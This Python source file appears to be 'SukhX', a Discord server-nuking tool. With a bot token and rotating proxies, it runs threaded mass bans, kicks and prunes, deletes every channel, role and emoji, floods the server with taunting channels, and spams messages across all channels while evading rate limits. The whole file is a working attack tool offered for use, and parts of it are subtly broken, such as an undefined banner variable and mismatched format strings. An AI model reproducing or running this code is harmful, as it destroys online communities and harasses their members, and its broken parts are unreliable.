"""
MIT License

Copyright (c) 2024  Somnath             

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""


import threading, webbrowser, discord, random, httpx, json, time, os; from discord.ext import commands;from itertools import cycle
import spam 

VERSION = '1.0.0'
chdhruv = ('somnath-wizzed-u','somnath-fucked-server','server-beamed','somnath runs the cord')
Aizer = spam.sukhop

__intents__ = discord.Intents.default()
__intents__.members = True
__proxies__, __client__, __config__, __threads__= cycle(open("proxies.txt", "r").read().splitlines()), commands.Bot(command_prefix="+", help_command=None, intents=__intents__), json.load(open("config.py", "r", encoding="utf-8")), 45
os.system("cls") if os.name == "nt" else os.system("clear")
token = input("{}({}SukhX{}) Token{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
os.system("cls") if os.name == "nt" else os.system("clear")

SOMNATH_art = """
            {}    ____        _    _      __  __
            {}   / ___| _   _| | _| |__   \ \/ /    {}│{}
            {}   \___ \| | | | |/ / '_ \   \  /     {}│{} {}>{} {}Discord: iblamesukhh 
            {}    ___) | |_| |   <| | | |  /  \     {}│{} {}>{} {}SOMNATH ON TOP{}
            {}   |____/ \__,_|_|\_\_| |_| /_/\_\ {}   {}│{}  
""".format("\x1b[38;5;196m", "\x1b[38;5;196m", "\x1b[38;5;196m", "\x1b[38;5;196m", "\x1b[38;5;196m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[38;5;196m","\x1b[38;5;196m", "\x1b[38;5;196m", "\x1b[38;5;196m", "\x1b[38;5;196m", "\x1b[38;5;196m", "\x1b[38;5;196m","\x1b[38;5;196m", "\x1b[38;5;196m", "\x1b[38;5;196m", "\x1b[38;5;196m", "\x1b[38;5;196m", "\x1b[0m")
options = """
                
                ({}01{}) {}> {}Ban Members            ({}06{}) {}> {}Delete Channels             
                ({}02{}) {}> {}Kick Members           ({}07{}) {}> {}Delete Roles            
                ({}03{}) {}> {}Prune Members          ({}08{}) {}> {}Delete Emojis                   
                ({}04{}) {}> {}Create Channels        ({}09{}) {}> {}Spammer                      
                ({}05{}) {}> {}Create Roles           ({}10{}) {}> {}Check Updates 
  
""".format("\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m",  
           "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", 
           "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", 
           "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", 
           "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m",)

class SukhX:
    def __init__(self):
        self.proxy = "http://" + next(__proxies__) if __config__["proxy"] == True else None
        self.session = httpx.Client(proxies=self.proxy)
        self.version = cycle(['v10', 'v9'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []

 
    def execute_ban(self, guildid: str, member: str, token: str):
        payload = {
            "delete_message_days": random.randint(0, 7)
        }
        while True:
            response = self.session.put(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/bans/{member}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code in [200, 201, 204]:
                print("{}({}+{}) Banned {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", member))
                self.banned.append(member)
                break
            elif "retry_after" in response.text:
                time.sleep(response.json()['retry_after'])
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", member))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being excluded from discord API {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            elif "Max number of bans for non-guild members have been exceeded." in response.text:
                print("{}({}!{}) Max number of bans for non-guild members have been exceeded".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to ban {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", member))
                break
            
    
    def execute_kick(self, guildid: str, member: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{member}", headers={"Authorization": f"Bot {token}"})
            if response.status_code in [200, 201, 204]:
                print("{}({}+{}) Kicked {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", member))
                self.kicked.append(member)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", member))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being excluded from discord API {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to kick {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", member))
                break
            
    
    def execute_prune(self, guildid: str, days: int, token: str):
        payload = {
            "days": days
        }
        response = self.session.post(f"https://discord.com/api/v9/guilds/{guildid}/prune", headers={"Authorization": f"Bot {token}"}, json=payload)
        if response.status_code == 200:
            print("{}({}+{}) Pruned {}{}{} members".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", response.json()['pruned'], "\x1b[0m"))
        elif "Max number of prune requests has been reached. Try again later" in response.text:
            print("{}({}!{}) Max number of prune reached. Try again in {}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", response.json()['retry_after']))
        elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
            print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
        else:
            print("{}({}-{}) Failed to prune {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", guildid))
            
            
    def execute_crechannels(self, guildid: str, channelsname: str, type: int, token: str):
        payload = {
            "type": type,
            "name": channelsname,
            "permission_overwrites": []
        }
        channelsname = channelsname.replace(" ", "-")
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 201:
                print("{}({}+{}) Created {}#{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", channelsname))
                self.channels.append(1)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}#{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channelsname))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to create {}#{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channelsname))
                break
            
            
            
    def execute_creroles(self, guildid: str, rolesname: str, token: str):
        colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
        payload = {
            "name": rolesname,
            "color": colors
        }
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 200:
                print("{}({}+{}) Created {}@{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", rolesname))
                self.roles.append(1)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}@{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", rolesname))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to create {}@{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", rolesname))
                break
            
            
    
    def execute_delchannels(self, channel: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/channels/{channel}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 200:
                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", channel))
                self.channels.append(channel)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channel))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channel))
                break
            
            
    def execute_delroles(self, guildid: str, role: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles/{role}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 204:
                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", role))
                self.roles.append(role)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", role))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", role))
                break
            
    def execute_delemojis(self, guildid: str, emoji: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/emojis/{emoji}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 204:
                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", emoji))
                self.emojis.append(emoji)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", emoji))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", emoji))
                break
            
    
    def execute_massping(self, channel: str, content: str, token: str):
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages", headers={"Authorization": f"Bot {token}"}, json={"content": content})
            if response.status_code == 200:
                print("{}({}+{}) Spammed {}{}{} in {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", content, "\x1b[0m", "\x1b[38;5;196m", channel))
                self.messages.append(channel)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channel))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to spam {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channel))
                break

    
    def menu(self):
        os.system(f"cls & title SukhX ^| Authenticated as: {__client__.user.name}#{__client__.user.discriminator}")
        print(SukhX_art + options + "\n")
        ans = input("{}({}SukhX{}) Option{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")) 
        
        if ans in ["1", "01"]:
            scrape = input("{}({}SukhX{}) Fetch IDs [Y/N]{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            if scrape.lower() == "n":
                try:
                    guild = __client__.get_guild(int(guildid))
                    with open("fetched/members.txt", "w") as a:
                        for member in guild.members:
                            a.write("{}{}".format(member.id, "\n"))
                except: pass
            else:
                pass
            self.banned.clear()
            members = open("fetched/members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_ban, args=(guildid, member, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                    
            time.sleep(3)
            print("{}({}SukhX{}) Banned {}/{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.banned), len(members)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["2", "02"]:
            self.kicked.clear()
            members = open("fetched/members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_kick, args=(guildid, member, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
            
            time.sleep(3)
            print("{}({}SukhX{}) Kicked {}/{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.kicked), len(members)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["3", "03"]:
            days = int(input("{}({}SukhX{}) Days{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")))
            self.execute_prune(guildid, days, token)
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["4", "04"]:
            type = input("{}({}SukhX{}) Channels Type ['t', 'v']{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            type = 2 if type == "v" else 0
            amount = int(input("{}({}SukhX{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")))
            self.channels.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_crechannels, args=(guildid, random.choice(chdhruv), type, token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}SukhX{}) Created {}/{} channels".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.channels), amount))
            time.sleep(1.5)
            self.menu()
                   
        elif ans in ["5", "05"]:
            raizer = (input("{}({}SukhX{}) Role Name{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")))
            amount = int(input("{}({}SukhX{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")))
            self.roles.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_creroles, args=(guildid, (raizer), token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}SukhX{}) Created {}/{} roles".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.roles), amount))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["6", "06"]:
            self.channels.clear()
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels:
                t = threading.Thread(target=self.execute_delchannels, args=(channel['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}SukhX{}) Deleted {}/{} channels".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.channels), len(channels)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["7", "07"]:
            self.roles.clear()
            roles = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}).json()
            for role in roles:
                t = threading.Thread(target=self.execute_delroles, args=(guildid, role['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                
            time.sleep(3)
            print("{}({}SukhX{}) Deleted {}/{} roles".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.roles), len(roles)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["8", "08"]:
            self.emojis.clear()
            emojis = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/emojis", headers={"Authorization": f"Bot {token}"}).json()
            for emoji in emojis:
                t = threading.Thread(target=self.execute_delemojis, args=(guildid, emoji['id'], token))
                t.start()
                while threading.active_count() >= __threads__:
                    t.join()
                    
            time.sleep(3)
            print("{}({}SukhX{}) Deleted {}/{} emojis".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.emojis), len(emojis)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["9", "09"]:
            self.messages.clear(); self.channels.clear()
            amount = int(input("{}({}SukhX{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")))
            Dhruv = (input("{}({}SukhX{}) Contant{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m")))
            Dhruv1 = Dhruv + ('\n **NT x Dhruv Runs Cord ** https://discord.gg/ntop')
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels: self.channels.append(channel['id'])
            channelz = cycle(self.channels)
            for i in range(amount):
                t = threading.Thread(target=self.execute_massping, args=(next(channelz),(Aizer), token))
                t.start()
                while threading.active_count() >= __threads__ - 15:
                    t.join()
                    
            time.sleep(3)
            print("{}({}SukhX{}) Spammed {}/{} messages".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", len(self.messages), amount))
            time.sleep(1.5)
            self.menu()
            
        elif ans == "10":
            try:
                response = self.session.get("https://github.com/dhruv4sure/SukhX/releases/tag/V1")
                check_version = response.headers.get('location').split('/')[7].split('v')[1]
                if VERSION != check_version:
                    print("{}({}SukhX{}) You're using an outdated version!".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
                    webbrowser.open(f"https://github.com/dhruv4sure/SukhX/releases/tag/{check_version}")
                else:
                    print("{}({}SukhX{}) You're using the current version!".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            except:
                print("{}({}SukhX{}) Couldn't reach the releases!".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            
            time.sleep(1.5)
            self.menu()
    
        
        elif ans == "11":
            print("Team Sukh | Developer: sukhwantss3x  || Join :- https:discord.gg/sukhop || You-tube :-  https://youtube.com/ || GitHub :- https://github.com/")
            input("")
            self.menu()
        
        elif ans == "12":
            print("{}({}SukhX{}) Thanks for using SukhX".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
            time.sleep(1.5)
            os._exit(0)
            
    
@__client__.event
async def on_ready():
    print("{}({}SukhX{}) Authenticated as{}: {}{}".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", f"{__client__.user.name}#{__client__.user.discriminator}"))
    time.sleep(1.5)
    SukhX().menu()
    

if __name__ == "__main__":
    try:
        os.system("title SukhX ^| Authentication & mode con: cols=95 lines=25")
        guildid = input("{}({}SukhX{}) Guild ID{}:{} ".format("\x1b[0m", "\x1b[38;5;196m", "\x1b[0m", "\x1b[38;5;196m", "\x1b[0m"))
        __client__.run(token, bot=True)
    except Exception as e:
        print("{}({}-{}) {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
        time.sleep(1.5)
        os._exit(0)
